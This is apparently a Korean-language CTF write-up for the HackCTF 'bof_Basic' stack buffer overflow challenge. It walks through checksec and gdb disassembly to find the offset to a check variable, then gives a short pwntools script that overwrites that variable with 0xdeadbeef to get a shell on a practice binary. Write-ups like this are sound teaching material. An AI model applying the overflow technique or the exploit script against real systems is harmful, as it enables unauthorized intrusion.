## [HackCTF] bof_Basic Writeup

---



### 0x00. Binary Analysis (Static)

---

![image](https://user-images.githubusercontent.com/33051018/75606334-ec577800-5b2e-11ea-8058-98abd131a06e.png)

`file` 명령을 통해 바이너리의 기본적 정보 획득. ( ex: ELF 32bit, not stripped, dynamically linked)

![image](https://user-images.githubusercontent.com/33051018/75606359-245ebb00-5b2f-11ea-8804-7387eedd98f9.png)

`checksec` 을 통해 `binary`에 적용된 보호기법 확인.



### 0x01. Binary Analysis (Dynamic)

---

일단 바이너리를 실행시켜보았다.

![image](https://user-images.githubusercontent.com/33051018/75606402-b2d33c80-5b2f-11ea-8b10-d19a9a68916e.png)

바이너리를 실행시키면 위 그림과 같이 바로 입력을 받은 이후 일련의 문자열을 출력한다.

`gdb` 를 통해 분석을 마저 진행한다.

![image](https://user-images.githubusercontent.com/33051018/75606437-05acf400-5b30-11ea-8375-e85ff59fb2ae.png)

`main` 함수를 `disassemble` 한 모습이다.

주요한 부분에 대해서만 설명을 진행한다.

`main+35~39`: `eax` 레지스터에 `ebp-0x34` 의 주소값을 입력 이후 `fgets` 함수 호출의 인자로 사용하기 위해 push

-> 여기서 `fgets` 가 앞서 바이너리를 실행했을 때 입력을 받는 부분임을 알 수 있으며 **`ebp-0x34`가 `buffer` 의 시작위치임을 알 수 있다. (이 문제를 푸는데에 있어 매우 중요한 key point)**

`main+54~59` :  `0x8048610`을 push하고 `printf` 함수를 호출한다. 즉, `0x8048610` 위치에 저장된 데이터가  `printf` 함수의 인자로 사용됨.

![image](https://user-images.githubusercontent.com/33051018/75606527-04c89200-5b31-11ea-83b7-9e16356e42ae.png)

해당 값을 `string` 포맷을 출력시켜보니 앞서 바이너리를 실행했을 때 출력되었던 문자열임을 확인할 수 있다.

![image](https://user-images.githubusercontent.com/33051018/75606564-5c66fd80-5b31-11ea-91a7-f5e3022e19c3.png)

(이 부분이 문제풀이의 핵심이 되는 분기 로직 부분)

`cmp` 와 `je` 명령을 통해 비교 이후 분기를 진행한다.

`main+127~137` : `ebp-0xc`값을 `0xdeadbeef`와 비교하여 다를 경우, `main+177`로 `EIP`를 이동시키고 프로그램을 종료한다.

`ebp-0xc` 부분을 `0xdeadbeef` 값으로 덮어씌워야 `system` 함수가 호출되며 쉘을 실행시킨다.



### 0x02. Exploit

---

앞서 우리는 버퍼가 시작되는 위치가 `ebp-0x34`임을 확인하였다. 

따라서, `ebp-0xc`에 도달하기 위해 `(ebp-0x34) - (ebp-0xc)` 만큼의 더미값 + `0xdeadbeef` 값으로 페이로드를 구성하여 프로그램에 전달하도록 한다.

```python
from pwn import *

p = process('./bof_basic')

payload = 'A' * (0x34-0xc)
payload += p32(0xdeadbeef)

p.sendline(payload)

p.interactive()
```



![image](https://user-images.githubusercontent.com/33051018/75606682-a43a5480-5b32-11ea-903d-650653feefe9.png)





